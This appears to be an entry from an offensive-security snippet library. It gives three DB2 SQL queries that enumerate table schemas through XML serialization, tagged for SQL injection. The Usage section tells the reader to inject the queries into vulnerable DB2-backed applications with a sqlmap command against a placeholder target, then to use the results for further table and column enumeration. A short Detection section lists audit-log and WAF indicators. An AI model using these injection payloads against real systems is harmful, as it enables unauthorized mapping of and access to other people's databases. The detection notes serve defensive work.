---
id: cd90d2a0-8b45-46ff-a75f-9d861768dc56
name: DB2-XML-Schema-Enumeration-Queries
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:33.116049+00:00'
updated_at: '2023-04-10T20:22:05.854264+00:00'
platforms:
  - Linux
  - Windows
  - Cloud
tags:
  - db2
  - enumeration
  - xml
  - sqli
validated: true
---

# DB2-XML-Schema-Enumeration-Queries

## Code

```sql
select xmlagg(xmlrow(table_schema)) from sysibm.tables -- returns all in one xml-formatted string
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) -- Same but without repeated elements
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- returns all in one xml-formatted string (v8). May need CAST(xml2clob(… AS varchar(500)) to display the result.
```

## Description

This SQL code snippet contains three queries for enumerating DB2 table schemas via XML serialization. The first aggregates all schemas, the second ensures uniqueness, and the third is tailored for DB2 v8 with CLOB conversion. Use in SQL injection to map database structure without direct access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| table_schema | Column from SYSIBM.TABLES holding schema names | N/A (built-in) |
| sysibm.tables | System view queried for metadata | N/A (built-in) |

## Usage

Inject these queries into vulnerable DB2-backed applications using tools like sqlmap: `sqlmap -u "http://target.com/page?id=1" --dbms=ibm --sql-query="select xmlagg..."`. Parse the XML output offline with tools like xmllint to extract schema names for further attacks like table/column enumeration.

## Detection

- Monitor DB2 audit logs for queries involving XMLAGG, XMLROW, XMLELEMENT, or XML2CLOB functions.
- WAF rules to flag SQL payloads with 'xmlagg' or 'sysibm.tables'.
- Anomalous XML output in application responses indicating injection success.

## Related

- [[procedures/DB2-Schema-Enumeration-via-XML-Serialization]]
